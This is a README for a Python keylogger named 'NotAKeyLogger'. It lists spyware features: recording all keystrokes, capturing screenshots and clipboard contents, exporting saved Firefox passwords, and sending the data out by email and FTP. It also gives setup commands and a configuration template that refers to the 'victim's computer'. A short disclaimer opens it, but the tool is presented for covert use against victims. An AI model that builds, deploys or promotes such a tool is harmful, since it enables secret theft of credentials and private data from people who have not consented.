# Disclaimer - 
I am not responsible for anything you do with this tool that could be considered illegal. Do not break the law!
# NotAKeyLogger
    A keylogger written in python.
    Features - 
        * Logs all the keystrokes from the keyboard
        * Sends data to an email account
        * Takes screenshots whenever a new application is opened
        * Exports the saved password from firefox
        * Uploads data to an ftp server
        * Copies the clipboard data as well
# Usage
Note: You must use python3.6 or greater due to the use of "f" strings

1. `pip3 install -r requirements.txt`
2. `python3 test.py`

The code requires an additional python file know as 'data.py'
It would contain these variables

1. sender_email = # Gmail email address that would be used to send the email
2. receiver_email = # Email that would be used to receive the emails
3. password = # Password for sender_email
4. path = # Location of the logging file
5. sspath = # Directory where screenshots would be saved
6. time_seconds = # Delay between each email and upload to the server
7. time_seconds_ss = # Time after which the screenshot would be taken after opening an application
8. ftp_address = #FTP address
9. ftp_username = # FTP username
10. ftp_password = # FTP user password
11. location_credentials = "~/.mozilla/firefox" # Firefox directory. Change it if you know it has been changed on the victim's computer.
